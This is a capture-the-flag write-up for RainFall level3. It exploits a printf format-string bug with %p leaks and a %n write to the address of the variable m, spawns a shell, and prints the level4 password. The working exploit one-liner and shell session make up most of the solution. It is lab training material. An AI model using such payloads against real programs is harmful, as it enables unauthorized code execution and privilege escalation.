# level3

## Header

```bash
ssh level3@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
```

<hr>

## Solution

From the inspecting [disassembled code](./source.s), we can understand that we can use vulnerable `printf` to overwrite the value of `m` variable and make the program execute `/bin/sh`.

```bash
level3@RainFall:~$ echo "zzzz %p %p %p %p %p" | ./level3 
zzzz 0x200 0xb7fd1ac0 0xb7ff37d0 0x7a7a7a7a 0x20702520
```

From these lines we can understand that `zzzz` argument is on `esp + 16` position i.e. it is the 4th argument. <br>
We'll use `%n` in order to write the data to the address of `m` var (`0x0804988c`).

First, we need to upload payload:
```bash
scp -P 4242 ./level3/payload.py level3@192.168.64.9:/tmp/payload3.py

python /tmp/payload3.py
```

This will produce payload file that should be used to exploit the binary:

```bash
level3@RainFall:~$ (python /tmp/payload.py; cat) | ./level3
# or
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" * 16 + "%4$n"'; cat) | ./level3

pwd
/home/user/level3
cd ../level4
ls -la   
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## References
- [OWASP - format string attack](https://owasp.org/www-community/attacks/Format_string_attack)